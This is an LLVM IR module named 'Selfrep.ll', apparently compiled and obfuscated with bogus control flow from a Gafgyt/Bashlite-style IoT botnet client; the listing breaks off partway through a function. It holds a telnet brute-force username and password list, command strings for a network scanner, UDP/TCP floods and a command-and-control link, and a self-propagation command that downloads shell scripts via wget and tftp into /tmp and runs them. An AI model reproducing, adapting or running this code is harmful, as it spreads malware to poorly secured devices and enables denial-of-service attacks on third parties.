; ModuleID = 'host/ir_bcf/Selfrep.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.timeval = type { i64, i64 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.0 }
%union.anon.0 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i32, i16, i8* }
%struct.udphdr = type { %union.anon.2 }
%union.anon.2 = type { %struct.anon.3 }
%struct.anon.3 = type { i16, i16, i16, i16 }
%struct.anon.1 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.state_t = type { i32, i8 }
%struct.ifreq = type { %union.anon.6, %union.anon.7 }
%union.anon.6 = type { [16 x i8] }
%union.anon.7 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@commServer = global [1 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i32 0, i32 0)], align 8
@.str = private unnamed_addr constant [8 x i8] c"IP:PORT\00", align 1
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@gotIP = global i32 0, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@usernames = global [6 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i32 0, i32 0)], align 16
@.str.1 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.2 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.3 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@.str.4 = private unnamed_addr constant [7 x i8] c"login\00\00", align 1
@.str.5 = private unnamed_addr constant [7 x i8] c"guest\00\00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c"support\00\00", align 1
@passwords = global [14 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i32 0, i32 0)], align 16
@.str.7 = private unnamed_addr constant [6 x i8] c"toor\00\00", align 1
@.str.8 = private unnamed_addr constant [10 x i8] c"changeme\00\00", align 1
@.str.9 = private unnamed_addr constant [6 x i8] c"1234\00\00", align 1
@.str.10 = private unnamed_addr constant [7 x i8] c"12345\00\00", align 1
@.str.11 = private unnamed_addr constant [8 x i8] c"123456\00\00", align 1
@.str.12 = private unnamed_addr constant [9 x i8] c"default\00\00", align 1
@.str.13 = private unnamed_addr constant [6 x i8] c"pass\00\00", align 1
@.str.14 = private unnamed_addr constant [10 x i8] c"password\00\00", align 1
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@scanPid = common global i32 0, align 4
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.75 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.15 = private unnamed_addr constant [9 x i8] c"buf: %s\0A\00", align 1
@fdopen_pids = internal global i32* null, align 8
@.str.16 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.17 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.18 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.19 = private unnamed_addr constant [14 x i8] c"/proc/cpuinfo\00", align 1
@.str.20 = private unnamed_addr constant [9 x i8] c"BOGOMIPS\00", align 1
@.str.21 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.22 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@ipState = internal global [5 x i8] zeroinitializer, align 1
@.str.23 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@.str.24 = private unnamed_addr constant [11 x i8] c"%d.%d.%d.0\00", align 1
@.str.25 = private unnamed_addr constant [6 x i8] c"ogin:\00", align 1
@.str.26 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.27 = private unnamed_addr constant [9 x i8] c"assword:\00", align 1
@.str.28 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.29 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.30 = private unnamed_addr constant [8 x i8] c"shell\0D\0A\00", align 1
@.str.31 = private unnamed_addr constant [181 x i8] c"cd /tmp || cd /var/run;wget http://ip/wbin.sh;sh wbin.sh;rm -rf wbin.sh;tftp -r tbin1.sh -g ip;sh tbin1.sh; tftp ip -c get tbin2.sh; sh tbin2.sh; rm -rf tbin1.sh tbin2.sh wbin.sh\0D\0A\00", align 1
@.str.32 = private unnamed_addr constant [10 x i8] c"ulti-call\00", align 1
@.str.33 = private unnamed_addr constant [16 x i8] c"REPORT %s:%s:%s\00", align 1
@.str.34 = private unnamed_addr constant [7 x i8] c"gayfgt\00", align 1
@.str.35 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.36 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.37 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.38 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.39 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.40 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.41 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.42 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.43 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.44 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@.str.45 = private unnamed_addr constant [6 x i8] c"PONG!\00", align 1
@.str.46 = private unnamed_addr constant [11 x i8] c"GETLOCALIP\00", align 1
@.str.47 = private unnamed_addr constant [10 x i8] c"My IP: %s\00", align 1
@.str.48 = private unnamed_addr constant [8 x i8] c"SCANNER\00", align 1
@.str.49 = private unnamed_addr constant [17 x i8] c"SCANNER ON | OFF\00", align 1
@.str.50 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.51 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.52 = private unnamed_addr constant [6 x i8] c"FORK\0A\00", align 1
@.str.53 = private unnamed_addr constant [5 x i8] c"HOLD\00", align 1
@.str.54 = private unnamed_addr constant [5 x i8] c"JUNK\00", align 1
@.str.55 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.56 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.57 = private unnamed_addr constant [9 x i8] c"KILLATTK\00", align 1
@.str.58 = private unnamed_addr constant [11 x i8] c"Killed %d.\00", align 1
@.str.59 = private unnamed_addr constant [13 x i8] c"None Killed.\00", align 1
@.str.60 = private unnamed_addr constant [10 x i8] c"LOLNOGTFO\00", align 1
@.str.61 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.62 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.63 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.64 = private unnamed_addr constant [9 x i8] c"[cpuset]\00", align 1
@.str.65 = private unnamed_addr constant [13 x i8] c"fork failed\0A\00", align 1
@.str.66 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.67 = private unnamed_addr constant [19 x i8] c"FAILED TO CONNECT\0A\00", align 1
@.str.68 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.69 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.70 = private unnamed_addr constant [3 x i8] c"SH\00", align 1
@.str.71 = private unnamed_addr constant [8 x i8] c"%s 2>&1\00", align 1
@.str.72 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.73 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.74 = private unnamed_addr constant [13 x i8] c"LINK CLOSED\0A\00", align 1
@x = common global i32 0
@y = common global i32 0
@x.1 = common global i32 0
@y.2 = common global i32 0
@x.3 = common global i32 0
@y.4 = common global i32 0
@x.5 = common global i32 0
@y.6 = common global i32 0
@x.7 = common global i32 0
@y.8 = common global i32 0
@x.9 = common global i32 0
@y.10 = common global i32 0
@x.11 = common global i32 0
@y.12 = common global i32 0
@x.13 = common global i32 0
@y.14 = common global i32 0
@x.15 = common global i32 0
@y.16 = common global i32 0
@x.17 = common global i32 0
@y.18 = common global i32 0
@x.19 = common global i32 0
@y.20 = common global i32 0
@x.21 = common global i32 0
@y.22 = common global i32 0
@x.23 = common global i32 0
@y.24 = common global i32 0
@x.25 = common global i32 0
@y.26 = common global i32 0
@x.27 = common global i32 0
@y.28 = common global i32 0
@x.29 = common global i32 0
@y.30 = common global i32 0
@x.31 = common global i32 0
@y.32 = common global i32 0
@x.33 = common global i32 0
@y.34 = common global i32 0
@x.35 = common global i32 0
@y.36 = common global i32 0
@x.37 = common global i32 0
@y.38 = common global i32 0
@x.39 = common global i32 0
@y.40 = common global i32 0
@x.41 = common global i32 0
@y.42 = common global i32 0
@x.43 = common global i32 0
@y.44 = common global i32 0
@x.45 = common global i32 0
@y.46 = common global i32 0
@x.47 = common global i32 0
@y.48 = common global i32 0
@x.49 = common global i32 0
@y.50 = common global i32 0
@x.51 = common global i32 0
@y.52 = common global i32 0
@x.53 = common global i32 0
@y.54 = common global i32 0
@x.55 = common global i32 0
@y.56 = common global i32 0
@x.57 = common global i32 0
@y.58 = common global i32 0
@x.59 = common global i32 0
@y.60 = common global i32 0
@x.61 = common global i32 0
@y.62 = common global i32 0
@x.63 = common global i32 0
@y.64 = common global i32 0
@x.65 = common global i32 0
@y.66 = common global i32 0
@x.67 = common global i32 0
@y.68 = common global i32 0
@x.69 = common global i32 0
@y.70 = common global i32 0
@x.71 = common global i32 0
@y.72 = common global i32 0
@x.73 = common global i32 0
@y.74 = common global i32 0
@x.75 = common global i32 0
@y.76 = common global i32 0
@x.77 = common global i32 0
@y.78 = common global i32 0
@x.79 = common global i32 0
@y.80 = common global i32 0

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %10

; <label>:10:                                     ; preds = %31, %1
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 4096
  br i1 %12, label %13, label %34

; <label>:13:                                     ; preds = %10
  %14 = load i32, i32* %3, align 4
  %15 = sub nsw i32 %14, 3
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %16
  %18 = load i32, i32* %17, align 4
  %19 = load i32, i32* %3, align 4
  %20 = sub nsw i32 %19, 2
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %21
  %23 = load i32, i32* %22, align 4
  %24 = xor i32 %18, %23
  %25 = xor i32 %24, -1640531527
  %26 = load i32, i32* %3, align 4
  %27 = xor i32 %25, %26
  %28 = load i32, i32* %3, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %29
  store i32 %27, i32* %30, align 4
  br label %31

; <label>:31:                                     ; preds = %13
  %32 = load i32, i32* %3, align 4
  %33 = add nsw i32 %32, 1
  store i32 %33, i32* %3, align 4
  br label %10

; <label>:34:                                     ; preds = %10
  %35 = load i32, i32* @x
  %36 = load i32, i32* @y
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %34
  %43 = load i32, i32* @x
  %44 = load i32, i32* @y
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %34
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1
  %7 = and i32 %6, 4095
  store i32 %7, i32* @rand_cmwc.i, align 4
  %8 = load i64, i64* %2, align 8
  %9 = load i32, i32* @rand_cmwc.i, align 4
  %10 = zext i32 %9 to i64
  %11 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = zext i32 %12 to i64
  %14 = mul i64 %8, %13
  %15 = load i32, i32* @c, align 4
  %16 = zext i32 %15 to i64
  %17 = add i64 %14, %16
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = lshr i64 %18, 32
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @c, align 4
  %21 = load i64, i64* %1, align 8
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = add i64 %21, %23
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* %3, align 4
  %27 = load i32, i32* @c, align 4
  %28 = icmp ult i32 %26, %27
  br i1 %28, label %29, label %50

; <label>:29:                                     ; preds = %0
  %30 = load i32, i32* @x.1
  %31 = load i32, i32* @y.2
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %29
  %38 = load i32, i32* %3, align 4
  %39 = add i32 %38, 1
  store i32 %39, i32* %3, align 4
  %40 = load i32, i32* @c, align 4
  %41 = add i32 %40, 1
  store i32 %41, i32* @c, align 4
  %42 = load i32, i32* @x.1
  %43 = load i32, i32* @y.2
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %50

; <label>:50:                                     ; preds = %originalBBpart2, %0
  %51 = load i32, i32* %4, align 4
  %52 = load i32, i32* %3, align 4
  %53 = sub i32 %51, %52
  %54 = load i32, i32* @rand_cmwc.i, align 4
  %55 = zext i32 %54 to i64
  %56 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %55
  store i32 %53, i32* %56, align 4
  ret i32 %53

originalBBalteredBB:                              ; preds = %originalBB, %29
  %57 = load i32, i32* %3, align 4
  %_ = shl i32 %57, 1
  %_1 = sub i32 0, %57
  %gen = add i32 %_1, 1
  %58 = add i32 %57, 1
  store i32 %58, i32* %3, align 4
  %59 = load i32, i32* @c, align 4
  %_2 = sub i32 %59, 1
  %gen3 = mul i32 %_2, 1
  %_4 = shl i32 %59, 1
  %_5 = sub i32 %59, 1
  %gen6 = mul i32 %_5, 1
  %_7 = sub i32 %59, 1
  %gen8 = mul i32 %_7, 1
  %_9 = sub i32 %59, 1
  %gen10 = mul i32 %_9, 1
  %60 = add i32 %59, 1
  store i32 %60, i32* @c, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #10
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %35, %1
  %11 = load i32, i32* @x.3
  %12 = load i32, i32* @y.4
  %13 = sub i32 %11, 1
  %14 = mul i32 %11, %13
  %15 = urem i32 %14, 2
  %16 = icmp eq i32 %15, 0
  %17 = icmp slt i32 %12, 10
  %18 = or i1 %16, %17
  br i1 %18, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %10
  %19 = load i8*, i8** %2, align 8
  %20 = load i32, i32* %4, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  %23 = load i8, i8* %22, align 1
  %24 = sext i8 %23 to i32
  %25 = call i32 @isspace(i32 %24) #10
  %26 = icmp ne i32 %25, 0
  %27 = load i32, i32* @x.3
  %28 = load i32, i32* @y.4
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %26, label %35, label %38

; <label>:35:                                     ; preds = %originalBBpart2
  %36 = load i32, i32* %4, align 4
  %37 = add nsw i32 %36, 1
  store i32 %37, i32* %4, align 4
  br label %10

; <label>:38:                                     ; preds = %originalBBpart2
  br label %39

; <label>:39:                                     ; preds = %54, %38
  %40 = load i32, i32* %5, align 4
  %41 = load i32, i32* %4, align 4
  %42 = icmp sge i32 %40, %41
  br i1 %42, label %43, label %52

; <label>:43:                                     ; preds = %39
  %44 = load i8*, i8** %2, align 8
  %45 = load i32, i32* %5, align 4
  %46 = sext i32 %45 to i64
  %47 = getelementptr inbounds i8, i8* %44, i64 %46
  %48 = load i8, i8* %47, align 1
  %49 = sext i8 %48 to i32
  %50 = call i32 @isspace(i32 %49) #10
  %51 = icmp ne i32 %50, 0
  br label %52

; <label>:52:                                     ; preds = %43, %39
  %53 = phi i1 [ false, %39 ], [ %51, %43 ]
  br i1 %53, label %54, label %57

; <label>:54:                                     ; preds = %52
  %55 = load i32, i32* %5, align 4
  %56 = add nsw i32 %55, -1
  store i32 %56, i32* %5, align 4
  br label %39

; <label>:57:                                     ; preds = %52
  %58 = load i32, i32* @x.3
  %59 = load i32, i32* @y.4
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %57
  %66 = load i32, i32* %4, align 4
  store i32 %66, i32* %3, align 4
  %67 = load i32, i32* @x.3
  %68 = load i32, i32* @y.4
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %75

; <label>:75:                                     ; preds = %123, %originalBBpart24
  %76 = load i32, i32* @x.3
  %77 = load i32, i32* @y.4
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %75
  %84 = load i32, i32* %3, align 4
  %85 = load i32, i32* %5, align 4
  %86 = icmp sle i32 %84, %85
  %87 = load i32, i32* @x.3
  %88 = load i32, i32* @y.4
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %86, label %95, label %126

; <label>:95:                                     ; preds = %originalBBpart28
  %96 = load i32, i32* @x.3
  %97 = load i32, i32* @y.4
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %95
  %104 = load i8*, i8** %2, align 8
  %105 = load i32, i32* %3, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds i8, i8* %104, i64 %106
  %108 = load i8, i8* %107, align 1
  %109 = load i8*, i8** %2, align 8
  %110 = load i32, i32* %3, align 4
  %111 = load i32, i32* %4, align 4
  %112 = sub nsw i32 %110, %111
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds i8, i8* %109, i64 %113
  store i8 %108, i8* %114, align 1
  %115 = load i32, i32* @x.3
  %116 = load i32, i32* @y.4
  %117 = sub i32 %115, 1
  %118 = mul i32 %115, %117
  %119 = urem i32 %118, 2
  %120 = icmp eq i32 %119, 0
  %121 = icmp slt i32 %116, 10
  %122 = or i1 %120, %121
  br i1 %122, label %originalBBpart219, label %originalBB10alteredBB

originalBBpart219:                                ; preds = %originalBB10
  br label %123

; <label>:123:                                    ; preds = %originalBBpart219
  %124 = load i32, i32* %3, align 4
  %125 = add nsw i32 %124, 1
  store i32 %125, i32* %3, align 4
  br label %75

; <label>:126:                                    ; preds = %originalBBpart28
  %127 = load i8*, i8** %2, align 8
  %128 = load i32, i32* %3, align 4
  %129 = load i32, i32* %4, align 4
  %130 = sub nsw i32 %128, %129
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds i8, i8* %127, i64 %131
  store i8 0, i8* %132, align 1
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %10
  %133 = load i8*, i8** %2, align 8
  %134 = load i32, i32* %4, align 4
  %135 = sext i32 %134 to i64
  %136 = getelementptr inbounds i8, i8* %133, i64 %135
  %137 = load i8, i8* %136, align 1
  %138 = sext i8 %137 to i32
  %139 = call i32 @isspace(i32 %138) #10
  %140 = icmp ne i32 %139, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %57
  %141 = load i32, i32* %4, align 4
  store i32 %141, i32* %3, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %75
  %142 = load i32, i32* %3, align 4
  %143 = load i32, i32* %5, align 4
  %144 = icmp sle i32 %142, %143
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %95
  %145 = load i8*, i8** %2, align 8
  %146 = load i32, i32* %3, align 4
  %147 = sext i32 %146 to i64
  %148 = getelementptr inbounds i8, i8* %145, i64 %147
  %149 = load i8, i8* %148, align 1
  %150 = load i8*, i8** %2, align 8
  %151 = load i32, i32* %3, align 4
  %152 = load i32, i32* %4, align 4
  %_ = sub i32 0, %151
  %gen = add i32 %_, %152
  %_11 = shl i32 %151, %152
  %_12 = sub i32 0, %151
  %gen13 = add i32 %_12, %152
  %_14 = sub i32 0, %151
  %gen15 = add i32 %_14, %152
  %_16 = sub i32 %151, %152
  %gen17 = mul i32 %_16, %152
  %153 = sub nsw i32 %151, %152
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds i8, i8* %150, i64 %154
  store i8 %149, i8* %155, align 1
  br label %originalBB10
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #1

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = load i32, i32* @x.5
  %3 = load i32, i32* @y.6
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

